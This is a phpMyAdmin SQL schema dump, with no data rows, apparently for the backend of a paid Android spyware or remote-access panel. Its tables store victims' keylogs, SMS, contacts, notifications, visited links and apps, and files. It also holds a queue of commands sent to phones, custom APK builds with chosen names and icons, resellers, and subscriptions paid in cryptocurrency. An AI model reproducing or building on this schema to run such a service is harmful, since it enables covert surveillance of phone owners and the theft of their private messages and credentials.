-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Sep 27, 2025 at 05:03 PM
-- Server version: 8.0.43
-- PHP Version: 8.3.24

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `modelo_clients`
--

-- --------------------------------------------------------

--
-- Table structure for table `activation_codes`
--

CREATE TABLE `activation_codes` (
  `id` int NOT NULL,
  `user_id` int NOT NULL,
  `activation_code` varchar(255) NOT NULL,
  `status` enum('yes','no') NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `alerts`
--

CREATE TABLE `alerts` (
  `notifi_id` int NOT NULL,
  `user_id` int NOT NULL,
  `state` int NOT NULL,
  `author` enum('admin','news','clients') NOT NULL,
  `alert_title` text NOT NULL,
  `content` text,
  `alert_ico` longtext,
  `alert_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `commands`
--

CREATE TABLE `commands` (
  `user_id` int NOT NULL,
  `content` text,
  `phone_id` text NOT NULL,
  `commandid` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `contacts`
--

CREATE TABLE `contacts` (
  `cont_id` int NOT NULL,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `cont_address` text NOT NULL,
  `cont_name` text NOT NULL,
  `cont_via` text NOT NULL,
  `og_id` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `custom_app`
--

CREATE TABLE `custom_app` (
  `build_id` int NOT NULL,
  `user_id` int DEFAULT NULL,
  `app_package` varchar(255) DEFAULT NULL,
  `app_path` varchar(255) DEFAULT NULL,
  `appname` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) NOT NULL,
  `app_ver` varchar(50) DEFAULT NULL,
  `build_state` enum('onbuild','failed','finished') DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `emails`
--

CREATE TABLE `emails` (
  `id` int NOT NULL,
  `email_to` varchar(255) DEFAULT NULL,
  `email_from` varchar(255) DEFAULT NULL,
  `date` datetime DEFAULT NULL,
  `content` text,
  `ip_address` varchar(45) DEFAULT NULL,
  `user_agent` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `jectors`
--

CREATE TABLE `jectors` (
  `jector_id` int NOT NULL,
  `user_id` int DEFAULT NULL,
  `jector_auth` varchar(255) DEFAULT NULL,
  `jector_ip` varchar(45) DEFAULT NULL,
  `temp_key` varchar(32) DEFAULT NULL,
  `user_email` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `nodeidfs`
--

CREATE TABLE `nodeidfs` (
  `idf` varchar(255) NOT NULL,
  `user_id` int NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `ismain` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `payments`
--

CREATE TABLE `payments` (
  `paymentid` int NOT NULL,
  `userid` int DEFAULT NULL,
  `invoice_id` varchar(50) NOT NULL,
  `crypto` enum('BTC','LTC','DOGE','TRX','USDT') DEFAULT NULL,
  `payment_state` enum('inprogress','success','failed') DEFAULT NULL,
  `payment_amount` decimal(10,2) DEFAULT NULL,
  `payment_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `total_paid` decimal(10,2) DEFAULT NULL,
  `subtype` enum('1 Month','3 Month','12 Month') NOT NULL,
  `additional_information` text,
  `transaction_id` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `phoneactivity`
--

CREATE TABLE `phoneactivity` (
  `activ_id` int NOT NULL,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `activ_time` text NOT NULL,
  `activ_data` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `phones`
--

CREATE TABLE `phones` (
  `phone_id` varchar(255) NOT NULL,
  `user_id` int NOT NULL,
  `phone_name` varchar(20) NOT NULL,
  `country` text NOT NULL,
  `address` text NOT NULL,
  `android_ver` text NOT NULL,
  `model` text NOT NULL,
  `wallpaper` longtext,
  `battery_charg` text NOT NULL,
  `network` text NOT NULL,
  `install_date` text NOT NULL,
  `last_ping` datetime NOT NULL,
  `mob_permissions` text,
  `keylogs_dates` text NOT NULL,
  `visited_links` text NOT NULL,
  `visited_apps` text NOT NULL,
  `notifications` text NOT NULL,
  `activities` text NOT NULL,
  `phone_options` text NOT NULL,
  `session_id` varchar(255) NOT NULL DEFAULT 'empty',
  `Commands` text,
  `isonline` tinyint(1) NOT NULL,
  `isRemoved` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `phone_apps`
--

CREATE TABLE `phone_apps` (
  `app_id` int NOT NULL,
  `user_id` int NOT NULL,
  `app_name` varchar(255) NOT NULL,
  `app_ico` longtext NOT NULL,
  `app_type` varchar(15) NOT NULL,
  `app_pkg` varchar(255) NOT NULL,
  `app_date` varchar(255) NOT NULL,
  `app_permissions` longtext NOT NULL,
  `app_receivers` longtext NOT NULL,
  `app_activitys` longtext NOT NULL,
  `phone_id` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `phone_notifys`
--

CREATE TABLE `phone_notifys` (
  `notifi_id` int NOT NULL,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `notifi_time` text NOT NULL,
  `notifi_data` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `resellers`
--

CREATE TABLE `resellers` (
  `sellerid` int NOT NULL,
  `sellerkey` char(19) NOT NULL,
  `additionalinfo` text,
  `language` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `sms`
--

CREATE TABLE `sms` (
  `sms_id` int NOT NULL,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `sms_address` text NOT NULL,
  `sms_name` text NOT NULL,
  `sms_date` text NOT NULL,
  `sms_content` longtext,
  `sms_tag` text NOT NULL,
  `sms_type` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `storage`
--

CREATE TABLE `storage` (
  `user_id` int NOT NULL,
  `store_name` varchar(255) DEFAULT NULL,
  `phone_id` text NOT NULL,
  `og_name` varchar(255) NOT NULL,
  `og_type` text NOT NULL,
  `og_size` text NOT NULL,
  `storeid` varchar(32) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `store`
--

CREATE TABLE `store` (
  `app_id` varchar(255) NOT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `app_size` varchar(50) DEFAULT NULL,
  `app_date` varchar(50) DEFAULT NULL,
  `app_folder` varchar(255) NOT NULL,
  `app_version` varchar(255) NOT NULL,
  `main_activity` varchar(155) NOT NULL,
  `app_ico` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `store_likes`
--

CREATE TABLE `store_likes` (
  `like_id` int NOT NULL,
  `user_id` int DEFAULT NULL,
  `app_id` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `suspended`
--

CREATE TABLE `suspended` (
  `id` int NOT NULL,
  `address` varchar(255) NOT NULL,
  `suspend_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `extra_info` text,
  `user_agent` varchar(255) NOT NULL,
  `cookie_key` varchar(32) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `userid` int NOT NULL,
  `usrname` varchar(8) DEFAULT NULL,
  `profilepic` text NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` text NOT NULL,
  `otp_salt` text,
  `Expire` date DEFAULT NULL,
  `subtype` enum('1 Month','3 Month','12 Month','new') NOT NULL DEFAULT 'new',
  `token` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci,
  `token_expiration` datetime DEFAULT NULL,
  `authorty` enum('admin','news','clients') NOT NULL,
  `hwid` varchar(255) DEFAULT NULL,
  `suspicious` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `admin_key` varchar(19) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `users_info`
--

CREATE TABLE `users_info` (
  `info_id` int NOT NULL,
  `user_id` int NOT NULL,
  `co_code` text NOT NULL,
  `country` text NOT NULL,
  `ip` varchar(45) NOT NULL,
  `user_agent` varchar(255) NOT NULL,
  `post_check` varchar(32) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `user_apps`
--

CREATE TABLE `user_apps` (
  `build_id` int NOT NULL,
  `user_id` int DEFAULT NULL,
  `app_package` varchar(255) DEFAULT NULL,
  `app_path` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) NOT NULL,
  `app_ver` varchar(50) DEFAULT NULL,
  `build_state` enum('onbuild','failed','finished') DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `visitedapps`
--

CREATE TABLE `visitedapps` (
  `vapp_id` int NOT NULL,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `vapp_time` text NOT NULL,
  `vapp_data` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Table structure for table `visitedlinks`
--

CREATE TABLE `visitedlinks` (
  `vlink_id` int NOT NULL,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `vlink_time` text NOT NULL,
  `vlink_data` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `activation_codes`
--
ALTER TABLE `activation_codes`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `unique_user_id` (`user_id`);

--
-- Indexes for table `alerts`
--
ALTER TABLE `alerts`
  ADD PRIMARY KEY (`notifi_id`),
  ADD UNIQUE KEY `unique_notifi_id` (`notifi_id`),
  ADD UNIQUE KEY `notifi_id` (`notifi_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `commands`
--
ALTER TABLE `commands`
  ADD UNIQUE KEY `commandid_2` (`commandid`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `commandid` (`commandid`);

--
-- Indexes for table `contacts`
--
ALTER TABLE `contacts`
  ADD PRIMARY KEY (`cont_id`),
  ADD UNIQUE KEY `unique_cont_id` (`cont_id`),
  ADD UNIQUE KEY `cont_id` (`cont_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `custom_app`
--
ALTER TABLE `custom_app`
  ADD PRIMARY KEY (`build_id`),
  ADD UNIQUE KEY `cstmappuniq` (`app_package`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `emails`
--
ALTER TABLE `emails`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `jectors`
--
ALTER TABLE `jectors`
  ADD PRIMARY KEY (`jector_id`),
  ADD UNIQUE KEY `user_id_2` (`user_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `nodeidfs`
--
ALTER TABLE `nodeidfs`
  ADD PRIMARY KEY (`idf`),
  ADD UNIQUE KEY `unique_idf` (`idf`),
  ADD UNIQUE KEY `idf` (`idf`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `payments`
--
ALTER TABLE `payments`
  ADD PRIMARY KEY (`paymentid`),
  ADD KEY `userid` (`userid`);

--
-- Indexes for table `phoneactivity`
--
ALTER TABLE `phoneactivity`
  ADD PRIMARY KEY (`activ_id`),
  ADD UNIQUE KEY `unique_activ_id` (`activ_id`),
  ADD UNIQUE KEY `activ_id` (`activ_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `phones`
--
ALTER TABLE `phones`
  ADD PRIMARY KEY (`phone_id`),
  ADD UNIQUE KEY `unique_phone_id` (`phone_id`),
  ADD UNIQUE KEY `phone_id` (`phone_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `phone_apps`
--
ALTER TABLE `phone_apps`
  ADD PRIMARY KEY (`app_id`),
  ADD UNIQUE KEY `app_id` (`app_id`),
  ADD KEY `idx_apps_id` (`user_id`);

--
-- Indexes for table `phone_notifys`
--
ALTER TABLE `phone_notifys`
  ADD PRIMARY KEY (`notifi_id`),
  ADD UNIQUE KEY `unique_notifi_id` (`notifi_id`),
  ADD UNIQUE KEY `notifi_id` (`notifi_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `resellers`
--
ALTER TABLE `resellers`
  ADD PRIMARY KEY (`sellerid`);

--
-- Indexes for table `sms`
--
ALTER TABLE `sms`
  ADD PRIMARY KEY (`sms_id`),
  ADD UNIQUE KEY `unique_sms_id` (`sms_id`),
  ADD UNIQUE KEY `sms_id` (`sms_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `storage`
--
ALTER TABLE `storage`
  ADD PRIMARY KEY (`og_name`),
  ADD UNIQUE KEY `storeid_2` (`storeid`),
  ADD UNIQUE KEY `store_name` (`store_name`,`og_name`),
  ADD UNIQUE KEY `store_name_2` (`store_name`,`og_name`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `storeid` (`storeid`);

--
-- Indexes for table `store`
--
ALTER TABLE `store`
  ADD PRIMARY KEY (`app_id`);

--
-- Indexes for table `store_likes`
--
ALTER TABLE `store_likes`
  ADD PRIMARY KEY (`like_id`),
  ADD UNIQUE KEY `user_id` (`user_id`,`app_id`),
  ADD KEY `app_id` (`app_id`);

--
-- Indexes for table `suspended`
--
ALTER TABLE `suspended`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`userid`),
  ADD UNIQUE KEY `userid` (`userid`),
  ADD UNIQUE KEY `email` (`email`);

--
-- Indexes for table `users_info`
--
ALTER TABLE `users_info`
  ADD PRIMARY KEY (`info_id`),
  ADD UNIQUE KEY `user_id` (`user_id`),
  ADD KEY `idx_user_id` (`user_id`);

--
-- Indexes for table `user_apps`
--
ALTER TABLE `user_apps`
  ADD PRIMARY KEY (`build_id`),
  ADD UNIQUE KEY `usrappuniq` (`app_package`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `visitedapps`
--
ALTER TABLE `visitedapps`
  ADD PRIMARY KEY (`vapp_id`),
  ADD UNIQUE KEY `unique_vapp_id` (`vapp_id`),
  ADD UNIQUE KEY `vapp_id` (`vapp_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `visitedlinks`
--
ALTER TABLE `visitedlinks`
  ADD PRIMARY KEY (`vlink_id`),
  ADD UNIQUE KEY `unique_vlink_id` (`vlink_id`),
  ADD UNIQUE KEY `vlink_id` (`vlink_id`),
  ADD KEY `user_id` (`user_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `activation_codes`
--
ALTER TABLE `activation_codes`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `alerts`
--
ALTER TABLE `alerts`
  MODIFY `notifi_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `commands`
--
ALTER TABLE `commands`
  MODIFY `commandid` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `contacts`
--
ALTER TABLE `contacts`
  MODIFY `cont_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `custom_app`
--
ALTER TABLE `custom_app`
  MODIFY `build_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `emails`
--
ALTER TABLE `emails`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `jectors`
--
ALTER TABLE `jectors`
  MODIFY `jector_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `payments`
--
ALTER TABLE `payments`
  MODIFY `paymentid` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `phoneactivity`
--
ALTER TABLE `phoneactivity`
  MODIFY `activ_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `phone_apps`
--
ALTER TABLE `phone_apps`
  MODIFY `app_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `phone_notifys`
--
ALTER TABLE `phone_notifys`
  MODIFY `notifi_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `resellers`
--
ALTER TABLE `resellers`
  MODIFY `sellerid` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `store_likes`
--
ALTER TABLE `store_likes`
  MODIFY `like_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `suspended`
--
ALTER TABLE `suspended`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `userid` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `users_info`
--
ALTER TABLE `users_info`
  MODIFY `info_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `user_apps`
--
ALTER TABLE `user_apps`
  MODIFY `build_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `visitedapps`
--
ALTER TABLE `visitedapps`
  MODIFY `vapp_id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `visitedlinks`
--
ALTER TABLE `visitedlinks`
  MODIFY `vlink_id` int NOT NULL AUTO_INCREMENT;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `activation_codes`
--
ALTER TABLE `activation_codes`
  ADD CONSTRAINT `activation_codes_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `alerts`
--
ALTER TABLE `alerts`
  ADD CONSTRAINT `alerts_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `commands`
--
ALTER TABLE `commands`
  ADD CONSTRAINT `cmnd_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `contacts`
--
ALTER TABLE `contacts`
  ADD CONSTRAINT `cont_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `custom_app`
--
ALTER TABLE `custom_app`
  ADD CONSTRAINT `custom_app_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `jectors`
--
ALTER TABLE `jectors`
  ADD CONSTRAINT `jectors_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `nodeidfs`
--
ALTER TABLE `nodeidfs`
  ADD CONSTRAINT `idf_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `payments`
--
ALTER TABLE `payments`
  ADD CONSTRAINT `payments_ibfk_1` FOREIGN KEY (`userid`) REFERENCES `users` (`userid`);

--
-- Constraints for table `phoneactivity`
--
ALTER TABLE `phoneactivity`
  ADD CONSTRAINT `activ_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `phones`
--
ALTER TABLE `phones`
  ADD CONSTRAINT `phones_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `phone_apps`
--
ALTER TABLE `phone_apps`
  ADD CONSTRAINT `phone_apps_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `phone_notifys`
--
ALTER TABLE `phone_notifys`
  ADD CONSTRAINT `notifi_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `sms`
--
ALTER TABLE `sms`
  ADD CONSTRAINT `sms_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `storage`
--
ALTER TABLE `storage`
  ADD CONSTRAINT `stor_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `store_likes`
--
ALTER TABLE `store_likes`
  ADD CONSTRAINT `store_likes_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  ADD CONSTRAINT `store_likes_ibfk_2` FOREIGN KEY (`app_id`) REFERENCES `store` (`app_id`);

--
-- Constraints for table `users_info`
--
ALTER TABLE `users_info`
  ADD CONSTRAINT `users_info_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `user_apps`
--
ALTER TABLE `user_apps`
  ADD CONSTRAINT `user_apps_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  ADD CONSTRAINT `user_apps_ibfk_2` FOREIGN KEY (`app_package`) REFERENCES `store` (`app_id`);

--
-- Constraints for table `visitedapps`
--
ALTER TABLE `visitedapps`
  ADD CONSTRAINT `vapp_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);

--
-- Constraints for table `visitedlinks`
--
ALTER TABLE `visitedlinks`
  ADD CONSTRAINT `vlink_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
